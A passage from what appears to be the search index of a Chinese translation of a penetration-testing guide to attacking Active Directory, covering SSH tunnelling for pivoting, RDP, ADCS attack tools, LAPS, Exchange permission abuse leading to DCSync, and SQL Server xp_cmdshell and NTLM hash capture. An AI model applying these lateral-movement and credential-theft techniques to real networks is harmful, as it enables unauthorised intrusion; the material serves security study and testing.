<p><code>$ ssh foo@db.contoso.local foo@db.contoso.local's password:  Linux db 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64  The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.  Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Mon Apr 26 11:23:20 2021 from 192.168.122.1 foo@db:~$ hostname id</code></p> <p>db.contoso.local\u4e2d\u4f5c\u4e3afoo\u7528\u6237\u7684SSH\u4f1a\u8bdd</p> <p>\u6b64\u5916\uff0c\u5982\u679c\u76ee\u6807\u673a\u5668\u88ab\u6dfb\u52a0\u5230\u57df\u4e2d\uff0c\u5b83\u4e5f\u53ef\u4ee5\u4e0eKerberos\u4e00\u8d77\u4f7f\u7528\u3002\u60a8\u53ef\u4ee5\u901a\u8fc7\u542f\u7528GSSAPI\u8eab\u4efd\u9a8c\u8bc1\u6765\u4f7f\u7528Kerberos\u8eab\u4efd\u9a8c\u8bc1\uff08\u4f7f\u7528\u53c2\u6570-o GSSAPIAuthentication=yes)\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#ssh-tunneling","title":"SSH tunneling","text":"<p>SSH\u96a7\u9053\u5141\u8bb8\u60a8\u5c06\u8fde\u63a5\u4ece\u672c\u5730\u8ba1\u7b97\u673a\u7aef\u53e3\u8f6c\u53d1\u5230\u8fdc\u7a0b\u8ba1\u7b97\u673a\uff0c\u53cd\u4e4b\u4ea6\u7136\uff0c\u56e0\u6b64\u5bf9\u4e8e\u7ed5\u8fc7\u9632\u706b\u5899\u4ee5\u53ca\u7f51\u7edc\u7684\u5404\u4e2a\u7f51\u6bb5\u4e2d\u8fdb\u884c\u8df3\u8f6c\u662f\u975e\u5e38\u6709\u7528\u7684\u3002</p> <p>SSH\u652f\u6301\u4e09\u79cd\u7c7b\u578b\u7684\u7aef\u53e3\u8f6c\u53d1\uff1a</p> <p>\u672c\u5730\u7aef\u53e3\u8f6c\u53d1</p> <p>\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u5c06\u672c\u5730\u7aef\u53e3\u6620\u5c04\u5230\u8fdc\u7a0b\u8ba1\u7b97\u673a\u53ef\u8bbf\u95ee\u7684\u7aef\u53e3\u3002\u4f8b\u5982\uff0c\u5982\u679c\u8fdc\u7a0b\u8ba1\u7b97\u673aremote.contoso.local\u53ef\u4ee5\u8bbf\u95eeweb.contoso.local:80\u4e2d\u7684\u7f51\u7ad9\uff0c\u800c\u60a8\u7684\u8ba1\u7b97\u673a\u5374\u65e0\u6cd5\u8bbf\u95ee\u8be5\u7f51\u7ad9\uff0c\u5219\u53ef\u4ee5\u901a\u8fc7\u672c\u5730\u7aef\u53e3\u8f6c\u53d1\u5c06\u672c\u5730\u7aef\u53e3\uff08\u4f8b\u59828080\uff09\u6620\u5c04\u5230web.contoso.local\u7684\u7aef\u53e380\uff0c\u65b9\u6cd5\u662f\u6267\u884cssh -L 8080:web.contoso.local:80 user@remote.contoso.local\u3002\u7136\u540e\uff0c\u60a8\u5c31\u53ef\u4ee5\u901a\u8fc7\u8bbf\u95ee\u672c\u5730\u7aef\u53e38080\u6765\u8bbf\u95ee\u8fdc\u7a0b\u7f51\u9875\u4e86\u3002</p> <pre><code>              `local                              remote                web                .----------.                        .--------.            .-----                |          |      SSH Tunnel        |        |            |       o      .---        ---. ================== .---      ---.        .---      /|\\ ---&gt;| 8080 -&gt; rand | &gt;&gt;----TCP--&gt;&gt;---&gt;&gt; | 22 -&gt; rand |&gt;-TCP--&gt;| 80      / \\     '---        ---' ================== '---      ---'        '---                |          |                        |        |            |                '----------'                        '--------'            '-----`\n</code></pre> <p>SSH\u672c\u5730\u7aef\u53e3\u8f6c\u53d1</p> <p>\u8fdc\u7a0b\u7aef\u53e3\u8f6c\u53d1</p> <p>\u8fdc\u7a0b\u7aef\u53e3\u8f6c\u53d1\u4e0e\u672c\u5730\u7aef\u53e3\u8f6c\u53d1\u6b63\u597d\u76f8\u53cd\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u60a8\u53ef\u4ee5\u8ba9\u8fdc\u7a0b\u8ba1\u7b97\u673a\u80fd\u591f\u8bbf\u95ee\u60a8\u7684\u8ba1\u7b97\u673a\u53ef\u4ee5\u8bbf\u95ee\u7684\u7aef\u53e3\u3002\u4f8b\u5982\uff0c\u5982\u679c\u60a8\u53ef\u4ee5\u8bbf\u95eeweb.contoso.local:80\u4e2d\u7684\u7f51\u9875\uff0c\u4f46\u8fdc\u7a0b\u8ba1\u7b97\u673a\u5374\u65e0\u6cd5\u8bbf\u95ee\u5b83\u4eec\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4ssh -R 8080:web.contoso.local:80 user@remote.contoso.local\u5c06\u8fdc\u7a0b\u8ba1\u7b97\u673a\u76848080\u7aef\u53e3\u6620\u5c04\u5230web.contoso.local\u768480\u7aef\u53e3\u3002\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\uff0c\u8fde\u63a5\u5230\u8fdc\u7a0b\u673a\u5668\u7aef\u53e38080\u7684\u4eba\u5c31\u80fd\u591f\u8bbf\u95ee\u8be5Web\u670d\u52a1\u5668\u4e86\u3002</p> <pre><code> `web                 local                           remote       ----.            .----------.                     .--------.          |            |          |     SSH Tunnel      |        |             ---.        .---        ---. ==============  .---      ---.        o         80 |&lt;--TCP-&lt;| rand &lt;- rand | &lt;&lt;--&lt;&lt;-TCP--&lt;&lt;  | 22 &lt;- 8080 | &lt;---- /|\\         ---'        '---        ---' ==============  '---      ---'       / \\          |            |          |                     |        |      ----'            '----------'                     '--------'`\n</code></pre> <p>SSH\u8fdc\u7a0b\u7aef\u53e3\u8f6c\u53d1</p> <p>\u52a8\u6001\u7aef\u53e3\u8f6c\u53d1</p> <p>\u6700\u540e\uff0c\u901a\u8fc7\u521b\u5efaSOCKS\u4ee3\u7406\uff0c\u52a8\u6001\u7aef\u53e3\u8f6c\u53d1\u5141\u8bb8\u60a8\u4e0e\u8fdc\u7a0b\u673a\u5668\u53ef\u8fbe\u7684\u4efb\u4f55\u7aef\u53e3\u8fdb\u884c\u901a\u4fe1\u3002\u60a8\u53ef\u4ee5\u6307\u5b9aSOCKS\u4ee3\u7406\u5c06\u8981\u4fa6\u542c\u7684\u672c\u5730\u7aef\u53e3\uff0c\u5b83\u5c06\u901a\u8fc7SSH\u5c06\u6240\u6709\u8bf7\u6c42\u8f6c\u53d1\u5230\u8fdc\u7a0b\u8ba1\u7b97\u673a\uff0c\u7136\u540e\u8f6c\u53d1\u5230\u76ee\u6807\u8ba1\u7b97\u673a\u548c\u7aef\u53e3\u3002\u4f8b\u5982\uff0c\u60a8\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4ssh-D 8080 user@remote.contoso.local\u5728\u7aef\u53e38080\u4e0a\u8bbe\u7f6e\u4e00\u4e2aSOCKS\u4ee3\u7406\u3002</p> <pre><code>                                                                         `web                                                                            .-----                                                                            |                       local                            remote            .---                    .----------.                      .--------.    .----&gt;| 80                    |          |      SSH Tunnel      |        |    |     '---                  .---        ---. ================ .---      ---.  |       |          web:80  |              | &gt;---web:80----&gt;&gt; |  ---&gt; rand |&gt;-'       '-----       o  -------&gt;|              |                  |         ---'      /|\\         | 8080 -&gt; rand |                  | 22       |      / \\ db:3306 |              |                  |         ---.            db          -------&gt;|              | &gt;---db:3306---&gt;&gt; |  ---&gt; rand |&gt;-.       .-----                  '---        ---' ================ '---      ---'  |       |                    |          |                      |        |    |     .---                    '----------'                      '--------'    '----&gt;| 3306                                                                          '---                                                                            |                                                                            '-----`\n</code></pre> <p>SSH\u52a8\u6001\u7aef\u53e3\u8f6c\u53d1</p> <p>\u6709\u65f6\uff0cSSH\u670d\u52a1\u5668\u4f1a\u7981\u7528TCP Forwarding\uff0c\u8fd9\u6837\u5c31\u65e0\u6cd5\u521b\u5efaSSH\u96a7\u9053\u4e86\u3002\u5728\u8fd9\u4e9b\u60c5\u51b5\u4e0b\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528SaSSHimi\u521b\u5efa\u96a7\u9053\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#rdp","title":"RDP","text":"<p>RDP\uff08Remote Desktop Protocol\uff09\u662f\u5141\u8bb8\u60a8\u8fde\u63a5\u5230\u63d0\u4f9b\u56fe\u5f62\u7528\u6237\u754c\u9762\u7684\u5176\u4ed6\u673a\u5668\u7684\u534f\u8bae\u3002\u5b83\u901a\u5e38\u5728Windows\u73af\u5883\u4e2d\u7528\u4e8e\u8fde\u63a5\u548c\u7ba1\u7406\u8fdc\u7a0b\u8ba1\u7b97\u673a\uff0c\u56e0\u4e3a\u9ed8\u8ba4\u60c5\u51b5\u4e0bWindows\u7cfb\u7edf\u4f1a\u63d0\u4f9b\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u3002</p> <p></p> <p>RDP Windows\u5ba2\u6237\u7aef</p> <p>\u901a\u5e38\u53ef\u4ee5\u901a\u8fc7\u68c0\u67e5\u7aef\u53e33389/TCP\u62163389/UDP\u662f\u5426\u5904\u4e8e\u5f00\u653e\u72b6\u6001\uff0c\u6765\u68c0\u67e5\u673a\u5668\u662f\u5426\u4f7f\u7528RDP\u534f\u8bae\u3002</p> <pre><code>                   `.----                        |    .-----.           .---    | RDP |----------&gt;| 3389 TCP and UDP    '-----'           '---                        |                        '----`\n</code></pre> <p>RDP\u7aef\u53e3</p> <p>\u4f46\u662f\uff0c\u4e3a\u4e86\u8bbf\u95ee\u8be5\u8ba1\u7b97\u673a\uff0c\u7528\u6237\u5fc5\u987b\u662fAdministrators\u6216Remote Desktop Users\u672c\u5730\u7ec4\u7684\u6210\u5458\u3002\u53e6\u5916\uff0c\u8981\u683c\u5916\u5c0f\u5fc3\uff0c\u56e0\u4e3aWindows\u4e2d\u53ea\u5141\u8bb8\u56fe\u5f62\u4f1a\u8bdd\uff0c\u6240\u4ee5\u901a\u8fc7RDP\u8fde\u63a5\u53ef\u80fd\u4f1a\u6ce8\u9500\u5176\u4ed6\u7528\u6237\u3002</p> <p>\u9664\u4e86\u8fdc\u7a0b\u7ba1\u7406\u673a\u5668\u4e4b\u5916\uff0c\u60a8\u8fd8\u53ef\u4ee5\u4f7f\u7528RDP\u521b\u5efa\u4e00\u4e2aSOCKS\u4ee3\u7406\uff0c\u8be5\u4ee3\u7406\u5141\u8bb8\u901a\u8fc7\u4f7f\u7528SocksOverRDP\u6216freerdp\u548cRDP2TCP\u6765\u4f7f\u7528\u8fdc\u7a0b\u673a\u5668\u5728\u7f51\u7edc\u4e2d\u8fdb\u884c\u8df3\u8f6c\u3002</p> <p>\u522b\u5fd8\u4e86\uff0c\u5f53\u4e00\u53f0\u673a\u5668\u901a\u8fc7RDP\u8fde\u63a5\u65f6\uff0c\u7528\u6237\u51ed\u636e\u4f1a\u901a\u8fc7\u7f51\u7edc\u53d1\u9001\u5230\u76ee\u6807\u673a\u5668\uff0c\u56e0\u6b64\uff0c\u901a\u8fc7RDP\u8fde\u63a5\u7684\u7528\u6237\u5f88\u5bb9\u6613\u906d\u9047\u57fa\u4e8elsass\u8fdb\u7a0b\u5185\u5b58\u8f6c\u50a8\u7684\u51ed\u636e\u5931\u7a83\u95ee\u9898\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#microsoft-extras","title":"Microsoft extras","text":"<p>Active Directory\u662f\u7f51\u7edc\u751f\u6001\u7cfb\u7edf\u4e2d\u7684\u6838\u5fc3\u90e8\u5206\uff0c\u8bb8\u591a\u5176\u4ed6Microsoft\u4ea7\u54c1\u5c06\u5176\u7528\u4e8e\u591a\u79cd\u7528\u9014\u3002\u5bf9\u4e8e\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u6765\u8bf4\uff0c\u5e94\u8be5\u7559\u610f\u57df\u4e2d\u662f\u5426\u5b89\u88c5\u4e86\u4e0b\u9762\u7684Microsoft\u8f6f\u4ef6\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#adcs","title":"ADCS","text":"<p>Active Directory\u51ed\u636e\u670d\u52a1(ADCS)\u662f\u2026\u2026</p> <p>\u8fd9\u91cc\u5c31\u4e0d\u7ed9\u51fa\u5177\u4f53\u7684\u5b9a\u4e49\u4e86\uff0c\u4f46\u662f\u5bf9\u4e8e\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u6765\u8bf4\uff0c\u5f3a\u70c8\u5efa\u8bae\u8bf7\u9605\u8bfb\u4ee5\u4e0b\u53c2\u8003\u8d44\u6599\uff1a</p> <ul> <li>https://posts.specterops.io/certified-pre-owned-d95910965cd2</li> <li>https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf</li> <li>https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/</li> <li>https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/</li> </ul> <p>\u4ee5\u4e0b\u662f\u76f8\u5173\u5de5\u5177\uff1a</p> <ul> <li>Certify\uff1a\u8bf7\u6c42\u51ed\u636e\u5e76\u5ba1\u67e5ADC\u914d\u7f6e\u4e2d\u7684\u5f31\u70b9\u3002</li> <li>ForgeCert\uff1a\u6784\u5efa\u81ea\u5b9a\u4e49/\u91d1\u7968\u6765\u5192\u5145\u7528\u6237\u3002</li> <li>Kekeo\uff1a\u5c31\u8fd9\u91cc\u6765\u8bf4\u53ef\u7528\u4e8e\u83b7\u53d6TGT\u6216\u4f7f\u7528\u51ed\u636e\u68c0\u7d22NT\u54c8\u5e0c\u503c\u3002</li> <li>Rubeus\uff1a\u5c31\u8fd9\u91cc\u6765\u8bf4\u53ef\u7528\u4e8e\u83b7\u53d6TGT\u6216\u4f7f\u7528\u51ed\u636e\u68c0\u7d22NT\u54c8\u5e0c\u503c\u3002</li> <li>ntlmrelayx.py\uff08ExAndroidDev impacket fork\uff09\uff1a\u5bf9ADCS Web\u7aef\u70b9\u6267\u884cNTLM\u4e2d\u7ee7\u653b\u51fb\u3002</li> <li>PetitPotam\uff1a\u89e6\u53d1NTLM\u4e2d\u7ee7\u653b\u51fb\u3002</li> <li>PKINITTools\uff1a\u4f7f\u7528\u51ed\u636e\u548c\u5176\u4ed6Python\u5de5\u5177\u6765\u68c0\u7d22NT\u54c8\u5e0c\u503c\u3002</li> <li>certi.py\uff1aCertify\u7684Impacket\u7248\u672c\u3002\u8bf7\u6c42\u51ed\u636e\u5e76\u68c0\u67e5ADC\u914d\u7f6e\u3002</li> </ul>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#laps","title":"LAPS","text":"<p>LAPS\uff08Local Administrator Password Solution\uff09\u662f\u4e00\u4e2a\u7ba1\u7406\u57df\u8ba1\u7b97\u673a\u672c\u5730\u7ba1\u7406\u5458\u5bc6\u7801\u7684\u5b9e\u7528\u5de5\u5177\u3002LAPS\u5c06\u672c\u5730\u7ba1\u7406\u5458\u5bc6\u7801\u968f\u673a\u5316\uff0c\u4ee5\u907f\u514d\u91cd\u7528\u51ed\u636e\uff0c\u5e76\u5b9a\u671f\u66f4\u6539\u5b83\u4eec\u3002</p> <p>\u4e3a\u6b64\uff0cLAPS\u5c06\u5411\u57df\u7684\u8ba1\u7b97\u673a\u5bf9\u8c61\u6dfb\u52a0\u4e86\u4e24\u4e2a\u5c5e\u6027\uff1ams-Mcs-AdmPwd\u548cms-Mcs-AdmPwdExpirationTime\u3002</p> <p>\u5c5e\u6027ms-Mcs-AdmPwd\u7528\u4e8e\u5b58\u50a8\u8ba1\u7b97\u673a\u672c\u5730\u7ba1\u7406\u5458\u5bc6\u7801\uff0c\u53ea\u6709\u5728\u7ed9\u51fa\u663e\u5f0f\u6388\u4e88\u76f8\u5e94\u6743\u9650\u65f6\u624d\u80fd\u67e5\u770b\u8be5\u5bc6\u7801\u3002\u5982\u679c\u60a8\u80fd\u591f\u83b7\u5f97\u672c\u5730\u7ba1\u7406\u5458\u5bc6\u7801\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u7ba1\u7406\u5458\u6743\u9650\u8fde\u63a5\u5230\u8ba1\u7b97\u673a\uff08\u4f7f\u7528NTLM\u8eab\u4efd\u9a8c\u8bc1\uff09\u3002</p> <p>\u53e6\u4e00\u4e2a\u5c5e\u6027ms-Mcs-AdmPwdExpirationTime\u53ef\u4ee5\u88ab\u4efb\u4f55\u4eba\uff08\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff09\u8bfb\u53d6\uff0c\u56e0\u6b64\uff0c\u4e3a\u4e86\u8bc6\u522b\u7531LAPS\u7ba1\u7406\u7684\u8ba1\u7b97\u673a\uff0c\u60a8\u53ef\u4ee5\u641c\u7d22\u5305\u542b\u8be5\u5c5e\u6027\u7684\u8ba1\u7b97\u673a\u5bf9\u8c61\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#exchange","title":"Exchange","text":"<p>Exchange\u662fMicrosoft\u5f00\u53d1\u7684\u90ae\u4ef6\u670d\u52a1\u5668\uff0c\u53ef\u4ee5\u5b89\u88c5\u5728Windows\u670d\u52a1\u5668\u4e2d\u5e76\u4e0eActive Directory\u96c6\u6210\u3002</p> <p>\u5b89\u88c5Exchange\u540e\uff0c\u5c06\u5728\u57df\u4e2d\u521b\u5efa\u591a\u4e2a\u7ec4\u548cACE\u3002</p> <p>\u57282019\u5e742\u6708\u66f4\u65b0\u4e4b\u524d\uff0c\u6700\u76f8\u5173\u7684\u4e8b\u60c5\u53ef\u80fd\u662fExchange Windows\u6743\u9650\u7ec4\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u62e5\u6709\u57df\u5bf9\u8c61\u7684WriteDacl\u6743\u9650\u3002\u8fd9\u610f\u5473\u7740\uff0c\u5728\u8fc7\u65f6\u7684\u5b89\u88c5\u4e2d\uff08\u80af\u5b9a\u5b58\u5728\u4e8e\u91ce\u751f\u73af\u5883\u4e2d\uff09\uff0c\u7531\u4e8e\u8fd9\u4e9b\u7ec4\u7684\u6210\u5458\u5bf9ACE\u5177\u6709\u5199\u6743\u9650\uff0c\u6240\u4ee5\uff0c\u4ed6\u4eec\u53ef\u4ee5\u5c06DS-Replication-Get-Changes\u548cDS-Replication-Get-Changes-All\u6743\u9650\u6388\u4e88\u57df\u4e2d\u7684\u4efb\u4f55\u7528\u6237\uff0c\u4ece\u800c\u5141\u8bb8\u8be5\u5e10\u6237\u6267\u884cdcsync\u653b\u51fb\uff0c\u8fdb\u800c\u5f97\u5230\u57df\u7528\u6237\u7684\u51ed\u636e\u3002</p> <p>\u6b64\u5916\uff0c\u6240\u6709Exchange\u670d\u52a1\u5668\u6240\u5c5e\u7684Exchange Trusted Subsystem\u7ec4\u90fd\u662fExchange Windows Permissions\u7ec4\u7684\u6210\u5458\u3002\u56e0\u6b64\uff0c\u53ea\u8981\u653b\u51fb\u8005\u80fd\u591f\u653b\u9677\u4e00\u53f0Exchange\u670d\u52a1\u5668\uff0c\u5c31\u80fd\u83b7\u5f97\u7834\u574f\u6574\u4e2a\u57df\u6240\u9700\u7684\u6743\u9650\u3002</p> <p>\u6700\u8457\u540d\u7684Exchange\u6743\u9650\u6ee5\u7528\u5c31\u662fPrivExchange\u653b\u51fb\uff0c\u8be5\u653b\u51fb\u6ee5\u7528Exchange\u670d\u52a1\u5668\u4e0a\u7684\u6f0f\u6d1e\uff0c\u5141\u8bb8\u7528\u6237\u5f3a\u5236\u5efa\u7acb\u4eceExchange\u670d\u52a1\u5668\u5230\u53e6\u4e00\u53f0\u8ba1\u7b97\u673a\u7684HTTP\u8eab\u4efd\u9a8c\u8bc1\u8fde\u63a5\u3002\u7136\u540e\uff0c\u901a\u8fc7\u6267\u884c\u4eceHTTP\u5230LDAP\u7684NTLM\u4e2d\u7ee7\u653b\u51fb\uff0c\u5f3a\u5236Exchange\u670d\u52a1\u5668\u5c06DCsync\u6743\u9650\u6388\u4e88\u4efb\u610f\u7528\u6237\u5e10\u6237\u3002\u5fae\u8f6f\u5df2\u7ecf\u57282019\u5e742\u6708\u7684\u66f4\u65b0\u4e2d\u53d1\u5e03\u4e86\u9488\u5bf9\u8be5\u6f0f\u6d1e\u7684\u8865\u4e01\u3002</p> <p>\u6b64\u5916\uff0cOrganization Admins\u7ec4\uff08\u4e5f\u662f\u7531Exchange\u6dfb\u52a0\u7684\uff09\u53ef\u4ee5\u63a7\u5236Exchange Windows Permissions\u548cExchange Trusted Subsystem\u7ec4\u7684\u6210\u5458\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u7531\u4e8eOrganization Admins\u662fExchange\u670d\u52a1\u5668\u4e2d\u7684\u672c\u5730\u7ba1\u7406\u5458\uff0c\u56e0\u6b64\uff0c\u53ea\u8981\u6210\u4e3a\u8be5\u7ec4\u7684\u6210\u5458\uff0c\u5c31\u80fd\u5165\u4fb5\u6574\u4e2a\u57df\u3002</p> <pre><code>                                                           `.--------.                                                                | Object |                                                 .--WriteDacl--&gt;| domain |                                                 |              '--------'                                                 |                                                 |                                                 |                                  .-----------------------------.                                  |            Group            |                          .------&gt;| Exchange Windows Permission |                          |       '-----------------------------'                          |                      ^                          |                      |             .-controls---|                    member             |            |                      |             |            |                      ^             |            |       .----------------------------.             |            |       |           Group            |             |            '------&gt;| Exchange Trusted Subsystem |             ^                    '----------------------------'  .---------------------.               ^                ^  |        Group        |               |                |  | Organization Admins |               |                |  '---------------------'             member           member             v                          |                |             |                .---------|----------------|----------.             |                |         |    Exchange    |          |             |                |         |    Servers     |          |             |                |         |                |          |             |                |        .---.            .---.       |             |                |       /   /|           /   /|       |             |                |      .---. |          .---. |       |             |                |      |   | '          |   | '       |             |                |      |   |/           |   |/        |             |                |      '---'            '---'         |             |                |      exch1            exch2         |             |                |        ^                ^           |             |                '--------|----------------|-----------'             |                         |                |             |                         '----------------'             |                                  |             '-----&gt;&gt;------admin of------&gt;&gt;-----'`\n</code></pre> <p>Exchange\u7684\u7ec4\u548c\u6743\u9650</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#sql-server","title":"SQL Server","text":"<p>Microsoft SQL Server(MSSQL)\u662f\u7531Microsoft\u521b\u5efa\u7684\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf\u3002\u5b83\u901a\u5e38\u5b89\u88c5\u5728Windows\u670d\u52a1\u5668\u8ba1\u7b97\u673a\u4e0a\uff0c\u76d1\u542cTCP\u7aef\u53e31433\uff0c\u5e76\u4e14\u8bb8\u591aWeb\u5e94\u7528\u7a0b\u5e8f\u5c06\u5176\u7528\u4f5c\u6570\u636e\u5e93\u3002</p> <p>\u7531\u4e8eSQL Server\u4f1a\u4fa6\u542cTCP\u7aef\u53e31433\uff0c\u6240\u4ee5\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u57df\u51ed\u636e\u8fde\u63a5\u5b83\uff0c\u56e0\u4e3a\u5b83\u4f7f\u7528TDS\u534f\u8bae\uff0c\u8be5\u534f\u8bae\u4e0eNTLM\u548cKerberos\u8eab\u4efd\u9a8c\u8bc1\u517c\u5bb9\u3002</p> <p>\u53ef\u4ee5\u4f7f\u7528TDS\u534f\u8bae\u901a\u8fc7TCP\u6216SMB\u4e0eSQL server\u8fdb\u884c\u901a\u4fe1\u3002\u5728\u4f7f\u7528TCP\u7684\u60c5\u51b5\u4e0b\uff0c\u9ed8\u8ba4\u7aef\u53e3\u662f1433\uff0c\u4f46\u4e5f\u53ef\u4ee5\u4f7f\u7528\u52a8\u6001\u7aef\u53e3\u3002</p> <p><code>.------.     .----------.   | NTLM |     | Kerberos |   '------'     '----------'      |              |      '------.-------'             |             |      .------'------.        .------------      |             |        |      |          .-----.   .---      |      .--&gt;| SMB |--&gt;| 445/TCP      |      |   '-----'   '---      |      |               |      |      |               |   .-----.   |             .---         SQL   | TDS |---'-----TCP----&gt;| 1433/TCP     '-----'                 '---        Server                             |                             |   .------.                .---   | SQLR |--------UDP----&gt;| 1434/UDP   '------'                '---                             |                             '------------</code></p> <p>SQL server\u7684\u7aef\u53e3\u548c\u534f\u8bae</p> <p>\u5f53\u4f7f\u7528\u52a8\u6001\u7aef\u53e3\u65f6\uff0c\u5c06\u9009\u62e9\u968f\u673aTCP\u7aef\u53e3\u3002\u82e5\u8981\u5141\u8bb8\u8fdc\u7a0b\u5ba2\u6237\u7aef\u53d1\u73b0\u8be5\u7aef\u53e3\uff0c\u5fc5\u987b\u5728UDP\u7aef\u53e31434\u542f\u7528SQL Server Browser\uff0c\u4ee5\u7b49\u5f85SQLR\uff08SQL Server Resolution\uff09\u67e5\u8be2\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528impacket mssqlinstance.py\u5de5\u5177\u6765\u53d1\u73b0SQL server\u52a8\u6001\u7aef\u53e3\u3002</p> <p><code>$ mssqlinstance.py 192.168.100.19 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation  [*] Instance 0 ServerName:SRV01 InstanceName:SQLEXPRESS IsClustered:No Version:15.0.2000.5 [*] Instance 1 ServerName:SRV01 InstanceName:MSSQLSERVER IsClustered:No Version:15.0.2000.5 tcp:50377</code></p> <p>\u53d1\u7ed9SQL Server Browser\u7684\u67e5\u8be2</p> <p>\u5728\u8fd9\u91cc\uff0c\u60a8\u53ef\u4ee5\u770b\u5230SQL Server\u4f7f\u7528\u7684\u7aef\u53e3\u662f50377\uff0c\u73b0\u5728\uff0c\u60a8\u5c31\u53ef\u4ee5\u4f7f\u7528SQL Server\u5ba2\u6237\u7aef\uff08\u5982HeidiSQL\u3001SQL Server Management Studio\u6216PowerUpSQL\uff09\u8fde\u63a5\u5230\u6570\u636e\u5e93\u4e86\u3002</p> <p><code>PS C:\\&gt; . .\\PowerUpSQL.ps1 PS C:\\&gt; Get-SQLQuery -Query \"Select @@version\" -Instance \"srv01,50377\"  Column1 ------- Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) ...</code></p> <p>\u57fa\u4e8e\u52a8\u6001\u7aef\u53e3\u7684SQL\u67e5\u8be2</p> <p>SQL server\u7684\u4e00\u4e2a\u91cd\u8981\u7279\u70b9\u662f\uff0c\u5982\u679c\u5141\u8bb8\u7684\u8bdd\uff0c\u53ef\u4ee5\u901a\u8fc7xp_cmdshell\u547d\u4ee4\u6765\u6267\u884c\u5176\u4ed6\u547d\u4ee4\u3002</p> <p>\u6709\u65f6\u5728\u914d\u7f6e\u9519\u8bef\u7684\u73af\u5883\u4e2d\uff0c\u5373\u4f7f\u7981\u7528\u4e86xp_cmdshell\u547d\u4ee4\uff0c\u7528\u6237\u4e5f\u6709\u8db3\u591f\u7684\u6743\u9650\u4f7f\u7528sp_configure\u6307\u4ee4\u542f\u7528\u8be5\u547d\u4ee4\u3002</p> <p>\u6b64\u5916\uff0cxp_dirtree\u547d\u4ee4\u53ef\u7528\u4e8e\u8bbf\u95ee\u7f51\u7edc\u6587\u4ef6\uff08\u4f7f\u7528UNC\u8def\u5f84\uff09\uff0c\u6216\u901a\u8fc7\u4f7f\u7528\u57df\u8ba1\u7b97\u673a\u5e10\u6237\u5411\u5176\u4ed6\u8ba1\u7b97\u673a\u53d1\u51fa\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u8bf7\u6c42\uff0c\u4ee5\u4fbf\u6536\u96c6NTLM\u54c8\u5e0c\u503c\u8fdb\u884c\u7834\u89e3\u6216\u6267\u884cNTLM\u4e2d\u7ee7\u3002</p> <p>SQL\u6ce8\u5165\u4e0d\u5728\u672c\u6587\u7684\u8ba8\u8bba\u8303\u56f4\u5185\uff0c\u4f46\u662f\u5982\u679c\u60a8\u60f3\u8981\u66f4\u591a\u5173\u4e8e\u5982\u4f55\u5728SQL Server\u6216\u5176\u4ed6\u6570\u636e\u5e93\u4e2d\u5229\u7528SQL\u6ce8\u5165\u7684\u4fe1\u606f\uff0c\u53ef\u4ee5\u67e5\u770bNetSPI\u3001Pentest Monkey\u6216PortSwigger\u7f51\u7ad9\u63d0\u4f9b\u7684\u8be6\u7ec6\u4ecb\u7ecd\u3002</p> <p>\u6b64\u5916\uff0c\u5bf9\u4e8e\u653b\u51fb\u8005\u6765\u8bf4\uff0c\u4e00\u4e2a\u4ee4\u4eba\u96be\u4ee5\u7f6e\u4fe1\u7684\u6709\u7528\u7279\u6027\u662fSQL Server\u7684\u94fe\u63a5\u3002SQL 